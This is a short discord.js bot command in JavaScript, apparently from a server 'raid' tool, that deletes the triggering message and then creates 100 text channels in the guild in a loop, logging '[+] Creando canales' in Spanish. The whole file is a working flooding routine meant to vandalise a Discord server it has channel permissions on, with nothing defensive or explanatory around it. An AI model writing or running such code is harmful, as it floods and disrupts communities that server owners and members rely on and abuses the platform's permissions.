const discord = require('discord.js')
const colors = require('colors')
const config = require('../config.json');

exports.run = async (client, message, args) => {
  message.delete()

  if (!message.guild.me.hasPermission("MANAGE_CHANNELS")) return console.log(colors.red(`No perms bro.`))
	let i = 0
    while(i < 100) {
      i++;
	  message.guild.createChannel(config.channels, {type: 'text'});
    }

    console.log(colors.green("  [+] Creando canales"))
  }
